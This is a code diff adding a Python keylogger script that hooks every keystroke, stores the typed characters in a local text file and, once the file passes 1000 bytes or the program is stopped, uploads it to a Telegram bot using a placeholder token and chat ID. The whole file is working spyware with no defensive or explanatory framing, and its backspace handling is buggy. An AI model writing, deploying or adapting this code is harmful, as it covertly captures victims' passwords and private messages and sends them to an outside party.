@@ -1,0 +1,65 @@
+import keyboard
+import requests
+import os
+
+file_path = 'pressed_keys.txt'  # File name to save the pressed keys
+telegram_bot_token = 'YOUR_TELEGRAM_BOT_TOKEN'  # Replace with your Telegram bot token
+telegram_chat_id = 'YOUR_TELEGRAM_CHAT_ID'  # Replace with your Telegram chat ID
+
+# Allowed keys
+allowed_keys = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+=<>?/.,\\|{}[]~`'\";: \n")
+
+def on_key_event(e):
+    key = e.name
+
+    # Check if the key is allowed
+    if key in allowed_keys:
+        with open(file_path, 'a') as file:
+            if e.event_type == keyboard.KEY_DOWN:  # Check if the event is a key press, not a key release
+                if key == 'space':
+                    file.write(' ')
+                elif key == 'backspace':
+                    remove_last_character()
+                elif key == 'enter':
+                    file.write('\n')  # Start a new line in the file
+                else:
+                    file.write(key)
+
+                # Check the number of characters and send the file if it reaches 1000 characters
+                if os.path.getsize(file_path) > 1000:
+                    send_to_telegram(file_path, telegram_bot_token, telegram_chat_id)
+                    clear_file_content()
+
+def remove_last_character():
+    with open(file_path, 'r') as file:
+        lines = file.readlines()
+    with open(file_path, 'w') as file:
+        for line in lines:
+            if line.strip() and line != '\n':  # Skip empty lines
+                file.write(line[:-1] + '\n')  # Remove the last character
+
+def send_to_telegram(file_path, bot_token, chat_id):
+    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
+    files = {'document': open(file_path, 'rb')}
+    data = {'chat_id': chat_id}
+
+    response = requests.post(url, files=files, data=data)
+
+    if response.ok:
+        print('File sent successfully to Telegram.')
+    else:
+        print('Error occurred while sending the file to Telegram.')
+
+def clear_file_content():
+    with open(file_path, 'w'):
+        pass  # Clears the content of the file
+
+# Bind the on_key_event function to the key press event
+keyboard.hook(on_key_event)
+
+try:
+    # Keep the program running in the background
+    keyboard.wait()
+except KeyboardInterrupt:
+    # Handle keyboard interrupt (e.g., when stopping the program)
+    send_to_telegram(file_path, telegram_bot_token, telegram_chat_id)
